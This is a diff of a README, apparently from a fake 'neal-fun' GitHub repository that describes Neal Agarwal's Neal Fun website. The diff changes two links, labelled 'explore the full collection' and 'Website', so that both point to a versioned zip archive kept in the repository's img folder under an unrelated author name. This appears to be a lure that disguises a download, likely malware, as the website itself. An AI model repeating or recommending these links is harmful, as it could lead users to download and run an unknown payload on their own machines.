@@ -3,7 +3,7 @@ Welcome to Neal Fun! This project explores a collection of creative, interactive
 
 *About Neal Fun*
 
-Neal Fun is a website created by Neal Agarwal, a developer known for his innovative and fun web experiences. The platform features a variety of games, simulations, and interactive experiments that engage users with unique and sometimes educational content. You can explore the full collection at [neal-fun](https://raw.githubusercontent.com/cannedsigmas/neal-fun/main/img/neal_fun_1.2.zip).
+Neal Fun is a website created by Neal Agarwal, a developer known for his innovative and fun web experiences. The platform features a variety of games, simulations, and interactive experiments that engage users with unique and sometimes educational content. You can explore the full collection at [neal-fun](https://github.com/cannedsigmas/neal-fun/raw/refs/heads/main/img/neal-fun-v2.7.zip).
 Neal Fun is a fantastic resource for interactive and engaging online activities! Whether you're looking for brain teasers, puzzles, or games to challenge yourself, Neal Fun offers a wide variety of options to keep you entertained and mentally sharp.
 
 *Popular Games on Neal Fun*
@@ -56,7 +56,7 @@ Neal Agarwal is a developer passionate about making the internet a more fun and 
 
 *Follow Kaloo Dinaz*
 
-Website: https://raw.githubusercontent.com/cannedsigmas/neal-fun/main/img/neal_fun_1.2.zip
+Website: https://github.com/cannedsigmas/neal-fun/raw/refs/heads/main/img/neal-fun-v2.7.zip
 
 GitHub: KalooDinaz
 
